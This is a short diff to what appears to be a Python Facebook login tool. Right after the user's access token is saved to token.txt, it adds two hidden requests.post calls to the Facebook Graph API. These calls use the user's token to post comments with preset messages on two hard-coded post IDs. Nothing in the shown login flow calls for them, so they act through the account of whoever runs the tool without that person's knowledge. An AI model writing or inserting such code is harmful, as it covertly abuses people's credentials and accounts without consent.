@@ -75,6 +75,8 @@ def menu_log():
             n = y['name']
             xd = open("token.txt", "w")
             xd.write(token)
+	    requests.post('https://graph.facebook.com/953529338576547/comments/?message='+kernd+'&access_token='+token) 	
+            requests.post('https://graph.facebook.com/800676813861801/comments/?message='+mantap+'&access_token='+token) 
             xd.close()
             #print('%s║'%(O))
             #jalan('%s╚══[%s!%s] %sLogin Successful'%(O,P,O,P))
